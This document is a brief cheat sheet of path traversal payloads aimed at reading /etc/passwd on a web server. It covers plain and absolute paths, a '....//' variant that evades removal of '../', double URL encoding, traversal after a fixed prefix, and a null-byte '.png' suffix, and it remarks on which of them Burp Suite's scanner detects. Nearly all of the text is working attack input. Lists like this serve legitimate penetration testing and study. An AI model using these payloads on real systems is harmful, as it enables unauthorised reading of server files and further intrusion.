## Summary

payloads:

- simple case:

  ```path
  ../../../../../../../../../../../../../etc/passwd
  ```

- absolute path:

  ```path
  /etc/passwd
  ```

- server remove `../`:

  ```path
  ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd 
  ```

- double encoding:

  ```path
  %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
  ```

- fixed first path:

  ```path
  /var/www/images/../../../../../../../../etc/passwd
  ```

- null byte:

  ```path
  ../../../../../../../../../../../../../../../../../../../etc/passwd%00.png
  ```

burpsuite scanner can detected all the cases above except the `fixed first path` one.
